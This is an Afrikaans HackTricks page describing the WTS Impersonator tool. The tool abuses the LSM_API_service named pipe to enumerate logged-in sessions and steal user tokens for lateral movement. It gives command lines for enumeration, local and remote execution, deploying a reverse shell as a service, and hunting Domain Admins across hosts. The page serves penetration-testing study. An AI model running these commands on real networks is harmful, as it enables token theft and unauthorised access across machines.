{{#include ../../banners/hacktricks-training.md}}

Die **WTS Impersonator** hulpmiddel benut die **"\\pipe\LSM_API_service"** RPC Genoemde pyp om stilweg ingelogde gebruikers te tel en hul tokens te kapen, terwyl tradisionele Token Impersonation tegnieke omseil word. Hierdie benadering fasiliteer naatlose laterale bewegings binne netwerke. Die innovasie agter hierdie tegniek word toegeskryf aan **Omri Baso, wie se werk beskikbaar is op [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Kernfunksionaliteit

Die hulpmiddel werk deur 'n reeks API-oproepe:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Sleutelmodules en Gebruik

- **Gebruikers Opname**: Plaaslike en afstandlike gebruikersopname is moontlik met die hulpmiddel, met die gebruik van opdragte vir enige van die scenario's:

- Plaaslik:
```powershell
.\WTSImpersonator.exe -m enum
```
- Afstandlik, deur 'n IP-adres of gasheernaam te spesifiseer:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Opdragte Uitvoer**: Die `exec` en `exec-remote` modules vereis 'n **Diens** konteks om te funksioneer. Plaaslike uitvoering benodig eenvoudig die WTSImpersonator uitvoerbare lêer en 'n opdrag:

- Voorbeeld van plaaslike opdrag uitvoering:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe kan gebruik word om 'n diens konteks te verkry:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Afstandlike Opdrag Uitvoering**: Betrek die skep en installering van 'n diens afstandlik soortgelyk aan PsExec.exe, wat uitvoering met toepaslike regte toelaat.

- Voorbeeld van afstandlike uitvoering:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Gebruiker Jag Module**: Teiken spesifieke gebruikers oor verskeie masjiene, wat kode onder hul kredensiale uitvoer. Dit is veral nuttig om Domein Administrators met plaaslike administratiewe regte op verskeie stelsels te teiken.
- Gebruik voorbeeld:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
